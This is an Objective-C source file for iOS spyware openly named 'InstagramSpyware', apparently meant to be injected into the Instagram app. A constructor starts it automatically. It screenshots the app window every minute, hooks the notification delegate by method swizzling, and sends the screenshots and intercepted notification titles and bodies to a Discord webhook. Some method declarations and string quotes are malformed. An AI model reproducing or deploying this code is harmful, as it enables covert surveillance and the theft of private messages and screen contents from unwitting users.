#import <Foundation/Foundation.h>
#import <UIKit/UIKit.h> 
#import <objc/runtime.h> 
#import <UserNotifications/UserNotifications.h>

@interface InstagramSpyware : NSObject

(instancetype)sharedInstance;
(void)startAll;
(void)takeScreenshot;
(void)setDiscordWebhookURL:(NSString *)webhookURL; @end
@implementation InstagramSpyware { NSTimer *_screenshotTimer; NSString *_discordWebhookURL; NSURLSession *_urlSession; }

(instancetype)sharedInstance { static InstagramSpyware *instance = nil; static dispatch_once_t onceToken; dispatch_once(&onceToken, ^{ instance = [[InstagramSpyware alloc] init]; }); return instance; }
(instancetype)init { self = [super init]; if (self) { NSURLSessionConfiguration *config = [NSURLSessionConfiguration defaultSessionConfiguration]; config.timeoutIntervalForRequest = 30.0; config.timeoutIntervalForResource = 60.0; _urlSession = [NSURLSession sessionWithConfiguration:config]; _discordWebhookURL = @"https://discord.com/api/webhooks/YOUR_WEBHOOK_ID/YOUR_WEBHOOK_TOKEN"; } return self; }

(void)setDiscordWebhookURL:(NSString *)webhookURL { _discordWebhookURL = webhookURL; }

(void)sendToDiscordWebhook:(NSDictionary *)payload { if (!_discordWebhookURL) { return; }

NSError *error; NSData *jsonData = [NSJSONSerialization dataWithJSONObject:payload options:0 error:&error]; if (error) { return; }

NSMutableURLRequest *request = [NSMutableURLRequest requestWithURL:[NSURL URLWithString:_discordWebhookURL]]; [request setHTTPMethod:@"POST"]; [request setValue:@"application/json" forHTTPHeaderField:@"Content-Type"]; [request setHTTPBody:jsonData];

NSURLSessionDataTask *task = [_urlSession dataTaskWithRequest:request completionHandler:^(NSData *data, NSURLResponse *response, NSError *error) { if (error) { return; }

NSHTTPURLResponse *httpResponse = (NSHTTPURLResponse *)response; if (httpResponse.statusCode < 200 || httpResponse.statusCode >= 300) { NSLog(@"Discord webhook failed with status %ld", (long)httpResponse.statusCode); }
}];

[task resume];

}

(void)sendScreenshotToDiscord:(UIImage *)screenshot { NSMutableURLRequest *request = [NSMutableURLRequest requestWithURL:[NSURL URLWithString:_discordWebhookURL]]; [request setHTTPMethod:@"POST"];

NSString *boundary = [NSString stringWithFormat:@"Boundary-%@", [[NSUUID UUID] UUIDString]]; [request setValue:[NSString stringWithFormat:@"multipart/form-data; boundary=%@", boundary] forHTTPHeaderField:@"Content-Type"];

NSMutableData *body = [NSMutableData data];

NSDictionary *payload = @{ @"content": @"📸 New Instagram screenshot captured", @"username": @"Instagram Spy", @"avatar_url": @"https://i.imgur.com/mDKlggm.png" };

NSData *jsonData = [NSJSONSerialization dataWithJSONObject:payload options:0 error:nil]; [body appendData:[[NSString stringWithFormat:@"--%@\r\n", boundary] dataUsingEncoding:NSUTF8StringEncoding]]; [body appendData:[@"Content-Disposition: form-data; name="payload_json"\r\n\r\n" dataUsingEncoding:NSUTF8StringEncoding]]; [body appendData:jsonData]; [body appendData:[@"\r\n" dataUsingEncoding:NSUTF8StringEncoding]];

NSData *imageData = UIImagePNGRepresentation(screenshot); [body appendData:[[NSString stringWithFormat:@"--%@\r\n", boundary] dataUsingEncoding:NSUTF8StringEncoding]]; [body appendData:[@"Content-Disposition: form-data; name="file1"; filename="screenshot.png"\r\n" dataUsingEncoding:NSUTF8StringEncoding]]; [body appendData:[@"Content-Type: image/png\r\n\r\n" dataUsingEncoding:NSUTF8StringEncoding]]; [body appendData:imageData]; [body appendData:[@"\r\n" dataUsingEncoding:NSUTF8StringEncoding]];

[body appendData:[[NSString stringWithFormat:@"--%@--\r\n", boundary] dataUsingEncoding:NSUTF8StringEncoding]];

[request setHTTPBody:body];

NSURLSessionDataTask *task = [_urlSession dataTaskWithRequest:request completionHandler:^(NSData *data, NSURLResponse *response, NSError *error) { if (error) { return; }

NSHTTPURLResponse *httpResponse = (NSHTTPURLResponse *)response; if (httpResponse.statusCode < 200 || httpResponse.statusCode >= 300) { NSLog(@"Screenshot upload to Discord failed with status %ld", (long)httpResponse.statusCode); }
}];

[task resume];

}

(void)takeScreenshot { UIWindow *keyWindow = nil;

if (@available(iOS 13.0, *)) { for (UIWindowScene *windowScene in [UIApplication sharedApplication].connectedScenes) { if (windowScene.activationState == UISceneActivationStateForegroundActive) { for (UIWindow *window in windowScene.windows) { if (window.isKeyWindow) { keyWindow = window; break; } } if (keyWindow) break; } } } else { keyWindow = [UIApplication sharedApplication].keyWindow; }

if (!keyWindow) { if (@available(iOS 15.0, *)) { for (UIWindowScene *windowScene in [UIApplication sharedApplication].connectedScenes) { if (windowScene.activationState == UISceneActivationStateForegroundActive) { keyWindow = windowScene.windows.firstObject; break; } } } else { NSArray *windows = [UIApplication sharedApplication].windows; keyWindow = windows.firstObject; } }

if (!keyWindow) { return; }

UIGraphicsBeginImageContextWithOptions(keyWindow.bounds.size, NO, [UIScreen mainScreen].scale); [keyWindow drawViewHierarchyInRect:keyWindow.bounds afterScreenUpdates:YES]; UIImage *image = UIGraphicsGetImageFromCurrentImageContext(); UIGraphicsEndImageContext();

if (image) { NSData *imageData = UIImagePNGRepresentation(image); NSString *documentsPath = [NSSearchPathForDirectoriesInDomains(NSDocumentDirectory, NSUserDomainMask, YES) firstObject];

NSDateFormatter *formatter = [[NSDateFormatter alloc] init]; [formatter setDateFormat:@"yyyy-MM-dd_HH-mm-ss"]; NSString *timestamp = [formatter stringFromDate:[NSDate date]]; NSString *fileName = [NSString stringWithFormat:@"ig_screenshot_%@.png", timestamp]; NSString *filePath = [documentsPath stringByAppendingPathComponent:fileName]; NSError *error; BOOL success = [imageData writeToFile:filePath options:NSDataWritingAtomic error:&error]; if (success) { [self sendScreenshotToDiscord:image]; }
}

}

static void (*original_didReceiveNotification)(id, SEL, UNUserNotificationCenter *, UNNotificationResponse *, void (^)(void)) = NULL;

void swizzled_didReceiveNotification(id self, SEL _cmd, UNUserNotificationCenter *center, UNNotificationResponse *response, void (^completionHandler)(void)) { UNNotificationContent *content = response.notification.request.content;

InstagramSpyware *spyware = [InstagramSpyware sharedInstance]; NSDictionary *notificationPayload = @{ @"content": [NSString stringWithFormat:@"🔔 Intercepted Instagram Notification\n**Title:** %@\n**Body:** %@", content.title, content.body], @"username": @"Instagram Spy", @"avatar_url": @"https://i.imgur.com/mDKlggm.png", @"embeds": @[@{ @"title": @"Notification Details", @"color": @5814783, @"fields": @[ @{ @"name": @"Title", @"value": content.title ?: @"No Title", @"inline": @NO }, @{ @"name": @"Body", @"value": content.body ?: @"No Body", @"inline": @NO }, @{ @"name": @"Timestamp", @"value": [NSDateFormatter localizedStringFromDate:[NSDate date] dateStyle:NSDateFormatterShortStyle timeStyle:NSDateFormatterShortStyle], @"inline": @NO } ], @"footer": @{ @"text": @"Instagram Spy" } }] }; [spyware sendToDiscordWebhook:notificationPayload]; if (original_didReceiveNotification) { original_didReceiveNotification(self, _cmd, center, response, completionHandler); } else if (completionHandler) { completionHandler(); }
}

(void)hookNotifications { id<UNUserNotificationCenterDelegate> delegate = [[UNUserNotificationCenter currentNotificationCenter] delegate]; Class delegateClass = [delegate class];

if (!delegateClass) { dispatch_after(dispatch_time(DISPATCH_TIME_NOW, (int64_t)(2.0 * NSEC_PER_SEC)), dispatch_get_main_queue(), ^{ [self hookNotifications]; }); return; }

Method originalMethod = class_getInstanceMethod(delegateClass, @selector(userNotificationCenter:didReceiveNotificationResponse:withCompletionHandler:)); if (originalMethod) { original_didReceiveNotification = (void (*)(id, SEL, UNUserNotificationCenter *, UNNotificationResponse *, void (^)(void)))method_getImplementation(originalMethod); method_setImplementation(originalMethod, (IMP)swizzled_didReceiveNotification); }

}

(void)startAll { _screenshotTimer = [NSTimer scheduledTimerWithTimeInterval:60.0 target:self selector:@selector(takeScreenshot) userInfo:nil repeats:YES];

dispatch_after(dispatch_time(DISPATCH_TIME_NOW, (int64_t)(2.0 * NSEC_PER_SEC)), dispatch_get_main_queue(), ^{ [self hookNotifications]; });

}

(void)dealloc { [_screenshotTimer invalidate]; [super dealloc]; }
@end

attribute((constructor)) void initInstagramSpyware() { [[NSNotificationCenter defaultCenter] addObserverForName:UIApplicationDidBecomeActiveNotification object:nil queue:[NSOperationQueue mainQueue] usingBlock:^(NSNotification *note) { [[InstagramSpyware sharedInstance] startAll]; }]; }
